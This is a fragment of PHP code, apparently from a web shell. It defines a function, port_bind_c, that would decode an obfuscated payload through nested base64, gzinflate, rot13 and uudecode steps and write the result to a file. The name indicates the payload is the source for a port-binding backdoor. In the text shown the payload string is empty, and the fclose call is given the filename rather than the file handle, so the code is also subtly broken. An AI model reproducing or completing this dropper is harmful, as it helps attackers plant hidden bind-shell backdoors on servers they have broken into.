function port_bind_c($file){
$port_bind='';
$text=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($port_bind)))))));
if($filez = @fopen($file,"w")){
@fputs($filez,$text);
@fclose($file);} 
}

